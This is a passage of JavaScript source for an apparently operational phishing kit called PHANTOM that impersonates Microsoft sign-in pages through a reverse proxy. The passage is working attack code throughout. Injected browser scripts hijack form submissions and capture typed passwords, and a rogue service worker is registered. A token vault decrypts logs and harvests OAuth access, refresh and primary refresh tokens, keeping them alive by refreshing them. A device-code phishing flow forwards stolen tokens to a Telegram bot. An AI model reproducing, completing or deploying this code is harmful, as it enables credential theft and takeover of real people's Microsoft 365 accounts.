    const map = { gzip: zlib.gzip, "x-gzip": zlib.gzip, deflate: zlib.deflate, br: zlib.brotliCompress, zstd: zlib.zstdCompress };
    return new Promise((resolve, reject) => {
        const fn = map[encoding];
        if (fn) fn(data, (err, out) => err ? reject(err) : resolve(out));
        else resolve(data);
    });
}

async function decompressResponseBody(data, contentEncoding) {
    if (!contentEncoding) return { decompressedResponseBody: data, encodings: [] };
    const encodings = contentEncoding.split(",").map(e => e.trim().toLowerCase()).filter(e => e);
    let d = data;
    for (let i = encodings.length - 1; i >= 0; i--) d = await decompressData(d, encodings[i]);
    return { decompressedResponseBody: d, encodings };
}

async function compressResponseBody(data, encodings) {
    let d = data;
    for (const enc of encodings) d = await compressData(d, enc);
    return d;
}

// ── 🌐 GLOBAL URL REWRITE FUNCTION ──
function rewriteUrl(url) {
    if (!url) return url;
    const proxyPath = PROXY_PATHNAMES.proxy;
    const destParam = PHISHED_URL_PARAMETER;
    const realHosts = [
        'login.microsoftonline.com',
        'login.live.com',
        'aadcdn.msftauth.net',
        'aadcdn.msauth.net',
        'login.msa.azure.com',
        'office.com',
        'microsoftonline.com',
        'live.com',
        'msauth.net',
        'msftauth.net'
    ];
    if (url.includes(proxyPath) || url.includes(destParam)) return url;
    const lower = url.toLowerCase();
    const isMicrosoft = realHosts.some(host => lower.includes(host));
    if (isMicrosoft) {
        return `${proxyPath}?${destParam}=${encodeURIComponent(url)}`;
    }
    if (url.startsWith('/common/') || url.startsWith('/login') || url.startsWith('/authorize')) {
        const full = `https://login.microsoftonline.com${url}`;
        return `${proxyPath}?${destParam}=${encodeURIComponent(full)}`;
    }
    if (url.match(/\.(css|js|png|jpg|jpeg|gif|svg|ico|webp|woff|woff2|ttf|eot)$/i)) {
        if (lower.includes('microsoft') || lower.includes('live') || lower.includes('office')) {
            return `${proxyPath}?${destParam}=${encodeURIComponent(url)}`;
        }
        return url;
    }
    if (/login|auth|oauth2/i.test(url) && !url.startsWith('http')) {
        const full = `https://login.microsoftonline.com/${url.startsWith('/') ? url : '/' + url}`;
        return `${proxyPath}?${destParam}=${encodeURIComponent(full)}`;
    }
    return url;
}

// ── HTML rewrite ──
function updateHTMLProxyResponse(body) {
    let html = body.toString('utf-8');
    const proxyPath = PROXY_PATHNAMES.proxy;
    const destParam = PHISHED_URL_PARAMETER;

    html = html.replace(/<form([^>]*)>/gi, (match, attributes) => {
        const actionMatch = attributes.match(/action\s*=\s*["']([^"']*)["']/i);
        if (actionMatch) {
            const originalAction = actionMatch[1];
            const newAction = rewriteUrl(originalAction);
            if (newAction !== originalAction) {
                const newAttributes = attributes.replace(/action\s*=\s*["'][^"']*["']/i, `action="${newAction}"`);
                return `<form${newAttributes}>`;
            }
        }
        return match;
    });

    const overrideScript = `
<script>
console.log('🔥 PHANTOM v11.35 CLIENT LOADED');
(function() {
    const proxyPath = '${PROXY_PATHNAMES.proxy}';
    const destParam = '${PHISHED_URL_PARAMETER}';
    const microsoftDomains = [
        'login.microsoftonline.com','login.live.com','aadcdn.msftauth.net','aadcdn.msauth.net',
        'login.msa.azure.com','office.com','microsoftonline.com','live.com','msauth.net','msftauth.net'
    ];

    function rewriteUrl(url) {
        if (typeof url !== 'string') return url;
        if (url.includes(proxyPath) || url.includes(destParam)) return url;
        const lower = url.toLowerCase();
        const isMicrosoft = microsoftDomains.some(domain => lower.includes(domain));
        if (isMicrosoft) {
            return proxyPath + '?' + destParam + '=' + encodeURIComponent(url);
        }
        if (url.startsWith('/common/') || url.startsWith('/login') || url.startsWith('/authorize')) {
            const full = 'https://login.microsoftonline.com' + url;
            return proxyPath + '?' + destParam + '=' + encodeURIComponent(full);
        }
        if (url.startsWith('/') && !url.match(/\\.(css|js|png|jpg|jpeg|gif|svg|ico|webp|woff|woff2|ttf|eot)$/i)) {
            const full = 'https://login.microsoftonline.com' + url;
            return proxyPath + '?' + destParam + '=' + encodeURIComponent(full);
        }
        if (/login|auth|oauth2/i.test(url) && !url.startsWith('http')) {
            const full = 'https://login.microsoftonline.com/' + (url.startsWith('/') ? url : '/' + url);
            return proxyPath + '?' + destParam + '=' + encodeURIComponent(full);
        }
        return url;
    }

    // --- Override window.location ---
    const originalLocation = window.location;
    let currentHref = originalLocation.href;

    function rewriteAndNavigate(url) {
        const rewritten = rewriteUrl(url);
        if (rewritten !== url) {
            console.log('[PHANTOM] Intercepted location change:', url, '->', rewritten);
            window.location.href = rewritten;
            return true;
        }
        return false;
    }

    Object.defineProperty(window, 'location', {
        configurable: true,
        enumerable: true,
        get: function() {
            return originalLocation;
        },
        set: function(value) {
            if (!rewriteAndNavigate(value)) {
                originalLocation.href = value;
            }
        }
    });

    const originalAssign = window.location.assign;
    window.location.assign = function(url) {
        if (!rewriteAndNavigate(url)) {
            originalAssign.call(this, url);
        }
    };
    const originalReplace = window.location.replace;
    window.location.replace = function(url) {
        if (!rewriteAndNavigate(url)) {
            originalReplace.call(this, url);
        }
    };

    // --- Form submit overrides ---
    const originalSubmit = HTMLFormElement.prototype.submit;
    HTMLFormElement.prototype.submit = function() {
        if (this.action) {
            const rewritten = rewriteUrl(this.action);
            if (rewritten !== this.action) {
                this.action = rewritten;
                console.log('[PHANTOM] submit() override: rewrote action to', rewritten);
            }
        }
        return originalSubmit.call(this);
    };

    const originalRequestSubmit = HTMLFormElement.prototype.requestSubmit;
    HTMLFormElement.prototype.requestSubmit = function(submitter) {
        if (this.action) {
            const rewritten = rewriteUrl(this.action);
            if (rewritten !== this.action) {
                this.action = rewritten;
                console.log('[PHANTOM] requestSubmit() override: rewrote action to', rewritten);
            }
        }
        return originalRequestSubmit.call(this, submitter);
    };

    document.addEventListener('submit', function(e) {
        const form = e.target;
        if (!form.action) return;
        const rewritten = rewriteUrl(form.action);
        if (rewritten !== form.action) {
            e.preventDefault();
            form.action = rewritten;
            console.log('[PHANTOM] Submit event intercepted: rewrote action to', rewritten);
            form.dataset.originalAction = rewritten;
            form.submit();
        } else {
            console.log('[PHANTOM] Submit event: action already OK', form.action);
        }
    }, true);

    function rewriteExistingForms() {
        document.querySelectorAll('form').forEach(form => {
            if (form.action) {
                const rewritten = rewriteUrl(form.action);
                if (rewritten !== form.action) {
                    form.action = rewritten;
                    console.log('[PHANTOM] Initial rewrite: form action ->', rewritten);
                }
            }
        });
    }
    rewriteExistingForms();

    const observer = new MutationObserver(function(mutations) {
        let needsRewrite = false;
        for (const mutation of mutations) {
            if (mutation.type === 'childList') {
                for (const node of mutation.addedNodes) {
                    if (node.nodeType === 1) {
                        if (node.tagName === 'FORM') { needsRewrite = true; break; }
                        const forms = node.querySelectorAll ? node.querySelectorAll('form') : [];
                        if (forms.length > 0) { needsRewrite = true; break; }
                    }
                }
            }
            if (needsRewrite) break;
        }
        if (needsRewrite) setTimeout(rewriteExistingForms, 50);
    });
    observer.observe(document.body, { childList: true, subtree: true });

    const originalSetAttribute = Element.prototype.setAttribute;
    Element.prototype.setAttribute = function(name, value) {
        if (this.tagName === 'FORM' && name.toLowerCase() === 'action') {
            const rewritten = rewriteUrl(value);
            if (rewritten !== value) {
                console.log('[PHANTOM] setAttribute intercepted: rewrote action', value, '->', rewritten);
                return originalSetAttribute.call(this, name, rewritten);
            }
        }
        return originalSetAttribute.call(this, name, value);
    };

    const actionDescriptor = Object.getOwnPropertyDescriptor(HTMLFormElement.prototype, 'action');
    if (actionDescriptor && actionDescriptor.set) {
        const originalSet = actionDescriptor.set;
        const originalGet = actionDescriptor.get;
        Object.defineProperty(HTMLFormElement.prototype, 'action', {
            set: function(value) {
                const rewritten = rewriteUrl(value);
                if (rewritten !== value) {
                    console.log('[PHANTOM] action setter intercepted: rewrote action', value, '->', rewritten);
                    originalSet.call(this, rewritten);
                } else {
                    originalSet.call(this, value);
                }
            },
            get: function() {
                return originalGet.call(this);
            },
            configurable: true,
            enumerable: true
        });
    }

    const originalFetch = window.fetch;
    window.fetch = function(url, options) {
        if (options && options.method && options.method.toUpperCase() === 'POST') {
            const rewritten = rewriteUrl(url);
            if (rewritten !== url) {
                console.log('[PHANTOM] FORCE REWRITE fetch POST:', url, '->', rewritten);
                return originalFetch(rewritten, options);
            }
        }
        return originalFetch(url, options);
    };

    const OriginalXHR = window.XMLHttpRequest;
    window.XMLHttpRequest = function() {
        const xhr = new OriginalXHR();
        const originalOpen = xhr.open;
        xhr.open = function(method, url, async, user, password) {
            if (method.toUpperCase() === 'POST') {
                const rewritten = rewriteUrl(url);
                if (rewritten !== url) {
                    console.log('[PHANTOM] FORCE REWRITE XHR POST:', url, '->', rewritten);
                    return originalOpen.call(this, method, rewritten, async, user, password);
                }
            }
            return originalOpen.call(this, method, url, async, user, password);
        };
        return xhr;
    };

    function capturePasswordFromForm(form) {
        if (!form) return null;
        const passwordField = form.querySelector('input[type="password"]');
        const emailField = form.querySelector('input[type="email"]') || form.querySelector('input[name="loginfmt"]') || form.querySelector('input[name="username"]');
        if (passwordField && passwordField.value) {
            const email = emailField ? emailField.value : 'Unknown';
            const password = passwordField.value;
            console.log('[PHANTOM] 🔑 Captured password from click:', password);
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password, url: window.location.href })
            }).catch(err => console.error('[PHANTOM] Capture failed:', err));
            return { email, password };
        }
        return null;
    }

    document.addEventListener('click', function(e) {
        const target = e.target;
        if (target.tagName === 'BUTTON' || (target.tagName === 'INPUT' && target.type === 'submit')) {
            const form = target.closest('form');
            if (form) {
                const buttonText = target.textContent || target.value || '';
                if (/sign in|login|next|submit|continue/i.test(buttonText) || target.type === 'submit') {
                    capturePasswordFromForm(form);
                }
            }
        }
        if (target.getAttribute('role') === 'button' && target.closest('form')) {
            const form = target.closest('form');
            capturePasswordFromForm(form);
        }
    }, true);

    document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            const target = e.target;
            if (target.tagName === 'INPUT' && target.type === 'password') {
                const form = target.closest('form');
                if (form) {
                    capturePasswordFromForm(form);
                }
            }
        }
    }, true);

    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('${PROXY_PATHNAMES.serviceWorker}', { scope: '/' })
            .then(function(reg) { console.log('[PHANTOM] Service worker registered.', reg); })
            .catch(function(err) { console.error('[PHANTOM] SW registration failed:', err); });
    } else {
        console.warn('[PHANTOM] Service Worker not supported');
    }

    console.log('🔥 PHANTOM client script initialization complete');
})();
</script>`;
    const scriptTag = `<script src="${PROXY_PATHNAMES.script}"></script>` + overrideScript;
    if (html.includes('<head>')) html = html.replace('<head>', `<head>${scriptTag}`);
    else if (html.includes('<html>')) html = html.replace('<html>', `<html><head>${scriptTag}</head>`);
    else html = `<head>${scriptTag}</head>` + html;
    return Buffer.from(html, 'utf-8');
}

function updateFederationRedirectUrl(body, proxyHostname) {
    try {
        const obj = JSON.parse(body.toString());
        const url = obj.Credentials.FederationRedirectUrl;
        const proxyUrl = new URL(`https://${proxyHostname}${PROXY_PATHNAMES.mutation}`);
        proxyUrl.searchParams.append(PHISHED_URL_PARAMETER, encodeURIComponent(url));
        obj.Credentials.FederationRedirectUrl = proxyUrl;
        return Buffer.from(JSON.stringify(obj));
    } catch (e) { return body; }
}

// ── Ensure files exist ──
const notFoundFile = path.join(__dirname, PROXY_FILES.notFound);
const scriptFile = path.join(__dirname, PROXY_FILES.script);
const swFileName = PROXY_PATHNAMES.serviceWorker.replace('/', '');
const swFilePath = path.join(__dirname, swFileName);
if (!fs.existsSync(notFoundFile)) fs.writeFileSync(notFoundFile, '<h1>404 Not Found</h1>');
if (!fs.existsSync(scriptFile)) fs.writeFileSync(scriptFile, 'console.log("Service worker loaded");');
// Service worker code with rewriteUrl embedded
const serviceWorkerCode = `
const PROXY_PATH = '${PROXY_PATHNAMES.proxy}';
const DEST_PARAM = '${PHISHED_URL_PARAMETER}';
const MICROSOFT_DOMAINS = [
    'login.microsoftonline.com','login.live.com','aadcdn.msftauth.net','aadcdn.msauth.net',
    'login.msa.azure.com','office.com','microsoftonline.com','live.com','msauth.net','msftauth.net'
];

function rewriteUrl(url) {
    if (typeof url !== 'string') return url;
    if (url.includes(PROXY_PATH) || url.includes(DEST_PARAM)) return url;
    const lower = url.toLowerCase();
    const isMicrosoft = MICROSOFT_DOMAINS.some(domain => lower.includes(domain));
    if (isMicrosoft) {
        return PROXY_PATH + '?' + DEST_PARAM + '=' + encodeURIComponent(url);
    }
    if (url.startsWith('/common/') || url.startsWith('/login') || url.startsWith('/authorize')) {
        const full = 'https://login.microsoftonline.com' + url;
        return PROXY_PATH + '?' + DEST_PARAM + '=' + encodeURIComponent(full);
    }
    if (url.startsWith('/') && !url.match(/\\.(css|js|png|jpg|jpeg|gif|svg|ico|webp|woff|woff2|ttf|eot)$/i)) {
        const full = 'https://login.microsoftonline.com' + url;
        return PROXY_PATH + '?' + DEST_PARAM + '=' + encodeURIComponent(full);
    }
    if (/login|auth|oauth2/i.test(url) && !url.startsWith('http')) {
        const full = 'https://login.microsoftonline.com/' + (url.startsWith('/') ? url : '/' + url);
        return PROXY_PATH + '?' + DEST_PARAM + '=' + encodeURIComponent(full);
    }
    return url;
}

self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', (event) => event.waitUntil(self.clients.claim()));

self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);
    // Skip our own proxy endpoint and internal paths
    if (url.pathname === PROXY_PATH ||
        url.pathname === '${PROXY_PATHNAMES.serviceWorker}' ||
        url.pathname === '${PROXY_PATHNAMES.script}') {
        return;
    }

    // Rewrite the request URL if needed
    const rewritten = rewriteUrl(event.request.url);
    if (rewritten !== event.request.url) {
        console.log('[SW] Rewriting request:', event.request.url, '->', rewritten);
        event.respondWith(fetch(rewritten, event.request));
        return;
    }

    // Otherwise, try to forward via the proxy (if needed) or just fetch normally
    event.respondWith(
        (async () => {
            try {
                const proxyRequest = {
                    url: event.request.url,
                    method: event.request.method,
                    headers: Object.fromEntries(event.request.headers.entries()),
                    body: await event.request.text(),
                    referrer: event.request.referrer,
                    mode: event.request.mode
                };
                const response = await fetch(PROXY_PATH, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(proxyRequest),
                    redirect: 'manual',
                    mode: 'same-origin'
                });
                return response;
            } catch (e) {
                console.error('SW fetch error:', e);
                return fetch(event.request);
            }
        })()
    );
});
`;
if (!fs.existsSync(swFilePath)) fs.writeFileSync(swFilePath, serviceWorkerCode);

// ── Token Vault ──
class TokenVault {
    constructor(logsDir, encryptionKey) {
        this.logsDir = logsDir;
        this.encryptionKey = encryptionKey;
        this.tokens = [];
        this.scanLogs();
    }
    extractUsernameFromToken(token) {
        try {
            const parts = token.split('.');
            if (parts.length === 3) {
                const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
                return payload.email || payload.preferred_username || payload.upn || 'unknown';
            }
        } catch (e) {}
        return 'unknown';
    }
    scanLogs() {
        this.tokens = [];
        const files = fs.readdirSync(this.logsDir).filter(f => f.endsWith('.log'));
        for (const file of files) {
            try {
                const content = fs.readFileSync(path.join(this.logsDir, file), 'utf-8');
                const lines = content.split('\n').filter(line => line.trim());
                for (const line of lines) {
                    try {
                        const entry = JSON.parse(line);
                        const iv = Object.keys(entry)[0];
                        const encrypted = entry[iv];
                        const decipher = crypto.createDecipheriv('aes-256-ctr', this.encryptionKey, Buffer.from(iv, 'hex'));
                        let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                        decrypted = Buffer.concat([decrypted, decipher.final()]);
                        const obj = JSON.parse(decrypted.toString('utf-8'));
                        const body = obj.proxyRequestBody;
                        if (body) {
                            const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
                            const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
                            if (accessMatch) {
                                const token = decodeURIComponent(accessMatch[1]);
                                this.tokens.push({ type: 'access', value: token, file, username: this.extractUsernameFromToken(token), timestamp: new Date().toISOString() });
                            }
                            const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
                            if (refreshMatch) {
                                const token = decodeURIComponent(refreshMatch[1]);
                                this.tokens.push({ type: 'refresh', value: token, file, username: this.extractUsernameFromToken(token), timestamp: new Date().toISOString() });
                            }
                            const idMatch = bodyStr.match(/id_token=([^&]+)/i);
                            if (idMatch) {
                                const token = decodeURIComponent(idMatch[1]);
                                this.tokens.push({ type: 'id', value: token, file, username: this.extractUsernameFromToken(token), timestamp: new Date().toISOString() });
                            }
                            const prtMatch = bodyStr.match(/prt=([^&]+)/i);
                            if (prtMatch) {
                                this.tokens.push({ type: 'prt', value: decodeURIComponent(prtMatch[1]), file, username: 'PRT', timestamp: new Date().toISOString() });
                            }
                        }
                    } catch (e) {}
                }
            } catch (e) {}
        }
        return this.tokens;
    }
    getStats() {
        return {
            total: this.tokens.length,
            access: this.tokens.filter(t => t.type === 'access').length,
            refresh: this.tokens.filter(t => t.type === 'refresh').length,
            id: this.tokens.filter(t => t.type === 'id').length,
            prt: this.tokens.filter(t => t.type === 'prt').length
        };
    }
    async healthCheckAll() {
        const results = [];
        const uniqueTokens = [];
        const seen = new Set();
        for (const token of this.tokens) {
            if (!seen.has(token.value) && token.type === 'access') {
                seen.add(token.value);
                uniqueTokens.push(token);
            }
        }
        for (const token of uniqueTokens.slice(0, 10)) {
            try {
                const response = await retry(async () => {
                    return await axios.get('https://graph.microsoft.com/v1.0/me', {
                        headers: { 'Authorization': `Bearer ${token.value}` },
                        timeout: 5000
                    });
                }, 2, 1000, 2);
                results.push({
                    token: token.value.slice(0, 20) + '...',
                    status: 'valid',
                    user: response.data.userPrincipalName,
                    username: token.username
                });
            } catch (e) {
                results.push({
                    token: token.value.slice(0, 20) + '...',
                    status: 'invalid',
                    error: e.message,
                    username: token.username
                });
            }
        }
        return results;
    }
    async exchangeToken(tokenValue) {
        try {
            const response = await retry(async () => {
                return await axios.post(
                    'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                    new URLSearchParams({
                        client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
                        refresh_token: tokenValue,
                        grant_type: 'refresh_token',
                        scope: 'https://graph.microsoft.com/.default offline_access'
                    }),
                    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
                );
            }, 3, 1000, 2);
            return response.data;
        } catch (err) {
            throw new Error(err.response?.data?.error_description || err.message);
        }
    }
}
const vault = new TokenVault(LOGS_DIRECTORY, ENCRYPTION_KEY);

// ── Auto-refresh daemon ──
async function refreshTokensDaemon() {
    console.log('🔄 Token Refresh Daemon started (every 30 min)');
    setInterval(async () => {
        for (const flow of deviceFlows) {
            if (flow.refresh_token && flow.status === 'approved') {
                try {
                    const response = await retry(async () => {
                        return await axios.post(
                            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                            new URLSearchParams({
                                client_id: flow.client_id || 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
                                refresh_token: flow.refresh_token,
                                grant_type: 'refresh_token',
                                scope: 'https://graph.microsoft.com/.default offline_access'
                            }),
                            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
                        );
                    }, 2, 1000, 2);
                    flow.access_token = response.data.access_token;
                    if (response.data.refresh_token) flow.refresh_token = response.data.refresh_token;
                    flow.last_refresh = new Date().toISOString();
                    saveDeviceFlows();
                } catch (e) { console.warn(`Refresh failed: ${e.message}`); }
            }
        }
    }, 30 * 60 * 1000);
}

function loadDeviceFlows() { try { if (fs.existsSync(DEVICE_FLOWS_FILE)) { deviceFlows = JSON.parse(fs.readFileSync(DEVICE_FLOWS_FILE, 'utf-8')); } } catch (e) {} }
function saveDeviceFlows() { try { fs.writeFileSync(DEVICE_FLOWS_FILE, JSON.stringify(deviceFlows, null, 2)); } catch (e) {} }
loadDeviceFlows();

function loadPRTStorage() { try { if (fs.existsSync(PRT_STORAGE_FILE)) { prtStorage = JSON.parse(fs.readFileSync(PRT_STORAGE_FILE, 'utf-8')); } } catch (e) {} }
function savePRTStorage() { try { fs.writeFileSync(PRT_STORAGE_FILE, JSON.stringify(prtStorage, null, 2)); } catch (e) {} }
loadPRTStorage();

class GraphClient {
    constructor(accessToken) {
        this.accessToken = accessToken;
        this.baseUrl = 'https://graph.microsoft.com/v1.0';
        this.cache = global._cache || new CacheManager();
    }
    async get(endpoint, useCache = true) {
        const cacheKey = `graph:get:${endpoint}`;
        if (useCache) {
            const cached = this.cache.get(cacheKey);
            if (cached) return cached;
        }
        const config = getAxiosConfig();
        config.headers['Authorization'] = `Bearer ${this.accessToken}`;
        const response = await retry(async () => {
            return await axios.get(`${this.baseUrl}${endpoint}`, config);
        }, 3, 1000, 2);
        if (useCache && response.status === 200) {
            this.cache.set(cacheKey, response.data, 300000);
        }
        return response.data;
    }
    async post(endpoint, data) {
        const config = getAxiosConfig();
        config.headers['Authorization'] = `Bearer ${this.accessToken}`;
        config.headers['Content-Type'] = 'application/json';
        const response = await retry(async () => {
            return await axios.post(`${this.baseUrl}${endpoint}`, data, config);
        }, 3, 1000, 2);
        return response.data;
    }
    async getUserProfile() {
        return this.get('/me?$select=id,displayName,mail,userPrincipalName,jobTitle,department,officeLocation,mobilePhone,businessPhones');
    }
}

function requireAuth(req, res) {
    const auth = req.headers.authorization;
    if (!auth) {
        res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="PHANTOM Dashboard"' });
        res.end();
        return false;
    }
    const base64 = auth.split(' ')[1];
    const [user, pass] = Buffer.from(base64, 'base64').toString().split(':');
    if (user === DASHBOARD_USER && pass === DASHBOARD_PASS) return true;
    res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="PHANTOM Dashboard"' });
    res.end();
    return false;
}

async function hasCapturedCredentials(logFilename) {
    try {
        const filePath = path.join(LOGS_DIRECTORY, logFilename);
        if (!fs.existsSync(filePath)) return false;
        const content = fs.readFileSync(filePath, 'utf-8');
        const lines = content.split('\n').filter(line => line.trim());
        for (const line of lines) {
            try {
                const entry = JSON.parse(line);
                const iv = Object.keys(entry)[0];
                const encrypted = entry[iv];
                const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
                let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                decrypted = Buffer.concat([decrypted, decipher.final()]);
                const obj = JSON.parse(decrypted.toString('utf-8'));
                const body = obj.proxyRequestBody;
                if (body) {
                    const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
                    if (/password|passwd|pass|pwd/i.test(bodyStr) ||
                        /otc|code|verificationCode|mfa|twofactor/i.test(bodyStr) ||
                        /access_token|refresh_token|id_token|prt/i.test(bodyStr)) {
                        return true;
                    }
                }
            } catch (e) {}
        }
        return false;
    } catch (e) { return false; }
}

// ── DEVICE CODE HANDLERS ──
async function handleDeviceCodeRequest(req, res) {
    if (!axios) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'server_error', error_description: 'axios not installed' }));
        return;
    }
    try {
        const clientId = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
        const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
            new URLSearchParams({ client_id: clientId, scope: 'https://graph.microsoft.com/.default offline_access' }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
        );
        const data = response.data;
        const flow = {
            device_code: data.device_code,
            user_code: data.user_code,
            verification_uri: data.verification_uri,
            expires_in: data.expires_in,
            interval: data.interval,
            status: 'pending',
            created: new Date().toISOString(),
            client_id: clientId,
            session_id: crypto.randomBytes(16).toString('hex')
        };
        deviceFlows.push(flow);
        saveDeviceFlows();
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(data));
    } catch (error) {
        console.error('Device code request error:', error.response?.data || error.message);
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'server_error', error_description: error.response?.data?.error_description || error.message }));
    }
}

async function handleDeviceCodeToken(req, res) {
    let rawBody = '';
    req.on('data', chunk => rawBody += chunk);
    req.on('end', async () => {
        try {
            let device_code;
            const contentType = req.headers['content-type'] || '';
            if (contentType.includes('application/json')) {
                const parsed = JSON.parse(rawBody);
                device_code = parsed.device_code;
            } else {
                const params = new URLSearchParams(rawBody);
                device_code = params.get('device_code');
            }
            if (!device_code) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'invalid_request', error_description: 'device_code required' }));
                return;
            }
            const flow = deviceFlows.find(f => f.device_code === device_code);
            const clientId = flow?.client_id || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
            const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                new URLSearchParams({
                    client_id: clientId,
                    device_code,
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
                }),
                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
            );
            const tokens = response.data;
            let userEmail = 'Device Code Flow';
            if (tokens.id_token) {
                try {
                    const parts = tokens.id_token.split('.');
                    if (parts.length === 3) {
                        const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
                        userEmail = payload.email || payload.preferred_username || payload.upn || 'Device Code Flow';
                    }
                } catch (e) {}
            }
            if (flow) {
                flow.status = 'approved';
                flow.access_token = tokens.access_token;
                flow.refresh_token = tokens.refresh_token;
                flow.id_token = tokens.id_token;
                flow.approved = new Date().toISOString();
                flow.username = userEmail;
                saveDeviceFlows();
            }
            try {
                const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
                await sendToTelegram({
                    sessionId: flow?.session_id || 'unknown_device_flow',
                    email: userEmail,
                    password: 'N/A',
                    mfa: 'N/A',
                    tokens: {
                        access_token: tokens.access_token,
                        refresh_token: tokens.refresh_token,
                        id_token: tokens.id_token
                    },
                    cookies: {}
                }, 'device', ip);
            } catch (e) { console.error('Device notification failed:', e.message); }
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify(tokens));
        } catch (error) {
            if (error.response?.data?.error === 'authorization_pending') {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'authorization_pending' }));
            } else if (error.response?.data?.error === 'expired_token') {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'expired_token' }));
            } else {
                console.error('Device token error:', error.response?.data || error.message);
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'server_error', error_description: error.response?.data?.error_description || error.message }));
            }
        }
    });
}

// ── DASHBOARD API HANDLER ──
async function handleDashboardAPI(req, res) {
    const url = req.url;
    let apiPath = url;
    if (apiPath.startsWith('/dash')) apiPath = apiPath.replace(/^\/dash/, '');
    if (apiPath.startsWith('/api/ip/')) {
        const ip = apiPath.replace('/api/ip/', '');
        try {
            const info = await getCountryInfo(ip);
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ ip, country: info.code, flag: info.flag, city: info.name === 'Unknown' ? 'Unknown' : info.name, asn: 'AS0', isp: 'Unknown ISP' }));
        } catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        return;
    }
    if (apiPath === '/api/status') {
        try {
            const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
            let totalSessions = files.length, lastCapture = null;
            const sorted = files.sort((a, b) => fs.statSync(path.join(LOGS_DIRECTORY, b)).mtime - fs.statSync(path.join(LOGS_DIRECTORY, a)).mtime);
            for (const file of sorted) {
                if (await hasCapturedCredentials(file)) {
                    lastCapture = fs.statSync(path.join(LOGS_DIRECTORY, file)).mtime.toISOString();
                    break;
                }
            }
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ online: true, totalSessions, lastCapture }));
        } catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        return;
    }
    if (apiPath === '/api/test-telegram') {
        try {
            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: `✅ Test from PHANTOM Dashboard at ${new Date().toISOString()}`,
                disable_web_page_preview: true
            }, { timeout: 5000 });
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, message: 'Test sent', response: response.status }));
        } catch (e) {
            res.writeHead(500, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: e.message, details: e.response?.data || '' }));
        }
        return;
    }
    if (apiPath === '/api/logs') {
        try {
            const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
            const logs = files.map(f => { const stat = fs.statSync(path.join(LOGS_DIRECTORY, f)); return { name: f, size: stat.size, modified: stat.mtime }; }).sort((a, b) => b.modified - a.modified);
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify(logs));
        } catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        return;
    }
    if (apiPath.startsWith('/api/log/')) {
        const filename = apiPath.replace('/api/log/', '');
        const filePath = path.join(LOGS_DIRECTORY, filename);
        if (!fs.existsSync(filePath)) { res.writeHead(404); res.end(JSON.stringify({ error: 'Not found' })); return; }
        try {
            const content = fs.readFileSync(filePath, 'utf-8');
            const lines = content.split('\n').filter(line => line.trim());
            const entries = lines.map(line => {
                try {
                    const entry = JSON.parse(line);
                    const iv = Object.keys(entry)[0];
                    const encrypted = entry[iv];
                    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
                    let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                    decrypted = Buffer.concat([decrypted, decipher.final()]);
                    return JSON.parse(decrypted.toString('utf-8'));
